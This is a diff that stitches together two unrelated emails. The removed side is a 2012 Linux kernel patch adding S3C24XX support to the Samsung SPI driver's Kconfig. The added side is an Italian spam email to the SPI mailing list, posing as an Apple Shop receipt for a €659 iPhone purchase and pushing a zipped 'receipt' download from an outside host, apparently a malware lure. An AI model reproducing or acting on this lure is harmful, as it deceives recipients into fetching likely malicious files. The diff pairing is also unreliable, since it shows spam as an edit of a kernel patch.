@@ -1,48 +1,59 @@
-From: Heiko =?iso-8859-1?q?St=FCbner?= <heiko@sntech.de>
-Subject: [PATCH 6/6] spi/s3c64xx: Allow usage for ARCH_S3C24XX
-Date: Sun, 4 Mar 2012 19:09:10 +0100
-Message-ID: <201203041909.10400.heiko@sntech.de>
-References: <201203041902.38318.heiko@sntech.de>
+From: comprare.ora-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org
+Subject: ATTENZIONE: Ricevuta del pagamento N.0312 in allegato
+Date: 4 Mar 2012 21:21:41 -0000
+Message-ID: <20120304212141.13823.qmail@ns384334.ovh.net>
 Mime-Version: 1.0
-Content-Type: Text/Plain;
-  charset="iso-8859-1"
-Content-Transfer-Encoding: 7bit
-Cc: ben-linux@fluff.org, linux-samsung-soc@vger.kernel.org,
-	linux-arm-kernel@lists.infradead.org,
-	spi-devel-general@lists.sourceforge.net
-To: Kukjin Kim <kgene.kim@samsung.com>,
-	Grant Likely <grant.likely@secretlab.ca>
-Return-path: <linux-samsung-soc-owner@vger.kernel.org>
-In-Reply-To: <201203041902.38318.heiko@sntech.de>
-Sender: linux-samsung-soc-owner@vger.kernel.org
+Content-Type: multipart/mixed; boundary="1330896101SPB"
+To: spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
+Return-path: <spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
+List-Unsubscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>,
+	<mailto:spi-devel-general-request-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org?subject=unsubscribe>
+List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=spi-devel-general>
+List-Post: <mailto:spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
+List-Help: <mailto:spi-devel-general-request-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org?subject=help>
+List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/spi-devel-general>,
+	<mailto:spi-devel-general-request-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org?subject=subscribe>
+Errors-To: spi-devel-general-bounces-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-spi.vger.kernel.org
 
-Newer SoCs from the S3C24XX line, namely S3C2416/2443/2450 contain
-hsspi-controllers compatible with the s3c64xx type.
 
-The previous patches enabled platform support for it, so make the
-driver also usable for the S3C24xx architecture.
 
-Signed-off-by: Heiko Stuebner <heiko@sntech.de>
----
-As it is part of a series this probably needs an ack from Grant Likely
-and should be merged via the samsung tree.
 
- drivers/spi/Kconfig |    2 +-
- 1 files changed, 1 insertions(+), 1 deletions(-)
 
-diff --git a/drivers/spi/Kconfig b/drivers/spi/Kconfig
-index ac92194..e411364 100644
---- a/drivers/spi/Kconfig
-+++ b/drivers/spi/Kconfig
-@@ -299,7 +299,7 @@ config SPI_S3C24XX_FIQ
- 
- config SPI_S3C64XX
- 	tristate "Samsung S3C64XX series type SPI"
--	depends on (ARCH_S3C64XX || ARCH_S5P64X0 || ARCH_EXYNOS)
-+	depends on (ARCH_S3C24XX || ARCH_S3C64XX || ARCH_S5P64X0 || ARCH_EXYNOS)
- 	select S3C64XX_DMA if ARCH_S3C64XX
- 	help
- 	  SPI driver for Samsung S3C64XX and newer SoCs.
--- 
-1.7.2.3
+--1330896101SPB
+
+Content-type: text/html; charset="windows-1251"
+
+Content-Transfer-Encoding: 8bit
+
+
+
+<B><font color=#4F81D6 size=5>AVVISO DI RICEVUTO PAGAMENTO N.0312:</font></B><BR><TR><TD><HR><BR>Gentile cliente, <BR>abbiamo ricevuto il pagamento della somma di 659,00 Euro con la sua carta di credito come da accordi per un acquisto di, <BR>N.1 (uno) iPhone 4S, Chip dual-core A5, fotocamera da 8 MP totalmente rinnovata, iOS 5 e iCloud.<BR>Il suo acquisto le sara recapitato al suo indirizzo che ci ha fornito al momento della registrazione.<BR>Il suo documento di ricevuta per la stampa N.0312 del pagamento online lo trova in allegato qui <a href=http://soloperte.clanteam.com/Documento0312.rtf.zip>Ricevuta 0312</a>.<BR><BR>Distinti saluti.<BR><BR><b><FONT COLOR=#7288C4>Ufficio Fatture Apple Shop S.r.l.<BR>Via Martiri Caduti, 24, (88100) <BR>E-mail: guidapierluigi-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org<BR></FONT><BR></b
+ ><CENTER><img src=http://www.credit-card-logos.com/images/multiple_credit-card-logos-1/credit_card_logos_9.gif></CENTER><HR><BR>
+
+
+
+
+--1330896101SPB
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+------------------------------------------------------------------------------
+Virtualization & Cloud Management Using Capacity Planning
+Cloud computing makes use of virtualization - but cloud computing 
+also focuses on allowing computing to be delivered as a service.
+http://www.accelacomm.com/jaw/sfnl/114/51521223/
+--1330896101SPB
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+spi-devel-general mailing list
+spi-devel-general-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
+https://lists.sourceforge.net/lists/listinfo/spi-devel-general
+
+--1330896101SPB--
